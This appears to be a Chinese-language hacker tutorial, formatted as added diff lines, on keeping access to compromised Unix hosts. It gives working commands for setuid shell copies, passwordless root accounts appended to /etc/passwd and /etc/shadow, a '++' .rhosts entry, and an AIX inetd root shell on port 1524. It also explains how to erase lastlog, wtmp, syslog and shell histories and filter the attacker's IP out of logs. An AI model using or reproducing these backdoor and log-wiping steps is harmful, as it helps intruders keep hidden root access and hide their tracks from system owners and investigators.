@@ -1,0 +1,108 @@
+1. setuid 
+#cp /bin/sh /tmp/.sh 
+#chmod u+s /tmp/.sh 
+加上 suid 位到shell上，虽然很简单，但容易被发现 
+
+
+2. echo "hack::0:0::/:/bin/csh" >> /etc/passwd 
+即给系统增加一个 id 为 0（root)的帐号，无口令。 
+但管理员很快就可以发现哦！ 
+
+3.echo "++">>/.rhosts 
+如果这个系统开了512,513的port呵呵，就可以 
+把一个名为hack加到.rhosts文件中，rlogin登陆，无要密码！ 
+
+
+4.修改 sendmail.cf文件 增加一个"wiz" 命令; 
+然后telnet www.xxx.com 25后，wiz。。。。ok 
+　 
+
+5。 改已有用户密码 
+
+如果主机上有好多用户，当你看到一个用户好久没登入了，就可以改他的密码 
+
+#passwd 可用passwd命令。 
+
+6.rootkit后门包 
+
+网上有好多地方下载，找找，自己试试看，我也在测试中！不会啊！！！！ 
+
+　 
+
+-Bsd 后门： 
+
+echo love::92:206::0:0::/:/bin/sh >> /etc/master.passwd 
+/usr/sbin/pwd_mkdb /etc/master.passwd 
+　 
+
+这里我添加一个love的用户用户的ID是92；ROOT的是0哦！ 
+好了我们添加一个用户了！那么权限不够怎么办呢？ 
+cp /bin/sh /tmp/.x (这个x就是随便选个，好像 .sh , .a , .b 等等） 
+chmod 777 /tmp/.x 
+chmod +s /tmp/.x 
+用这个给他做个小后门吧 
+以后我们登陆的这台肉鸡以后就可以用tmp/.x来提升权限了。 
+　 
+
+-AIX 后门 （Kelvinzhou教我的，感谢你） 
+
+echo "ingreslock stream tcp nowait root /bin/sh">>/tmp/.x 
+/usr/sbin/inetd -s /tmp/.x 
+rm /tmp/.x 
+这样你就可以telnet ip 1524直接得到rootshell 
+
+-SunOs 后门 
+
+echo "love::0:0::/:/bin/bash" >> /etc/passwd 
+echo "love::::::::" >> /etc/shadow 
+
+当你以telnet上时，你就是root了！不过不保险！ 
+
+-Linux 后门 
+
+echo "love::0:0::/:/bin/bash" >> /etc/passwd 
+echo "love::::::::" >> /etc/shadow 
+
+有时间的话，就多留几个后门！ 
+
+　 
+
+留了后门就要擦你的PP了，不是吧，这也忘了！ 
+
+Unix系统日志文件通常是存放在 "/var/log　and /var/adm" 目录下的。通常我们可以查看syslog.conf来看看日志配置的情况．如：cat /etc/syslog.conf 
+一般我们要清除的日志有 
+
+lastlog 
+
+utmp 
+
+wtmp 
+
+messages 
+
+syslog 
+
+sulog 
+
+此外，各种shell还会记录用户使用的命令历史，它使用用户主目录下的文件来记录这些命令历史，通常这个文件的名字为.sh_history (ksh)，.history (csh)，或.bash_history (bash)等。 
+
+如果你有像wipe.c 那样的清日志的程序，就可以让它来做，不然的话就要手动了! 建议不要用rm掉日志，最好是，把日志改编， 
+
+比如： 
+
+#cat > /usr/log/lastlog 
+
+　　－＞这里是你要的写的东西，也可以不输入哦！ 
+
+^d　－＞这里的^d是按键 ctrl + d！ 结束！ 
+
+# 
+
+
+剩下的事情： 
+
+　　1、删除我的telnet记录。 
+
+　　2、删除http的日志。 
+
+　　清除日志我使用的办法是：cat xxx |grep -V "IP" ＞＞temp然后在把temp覆盖那些被我修改过的日志文件。
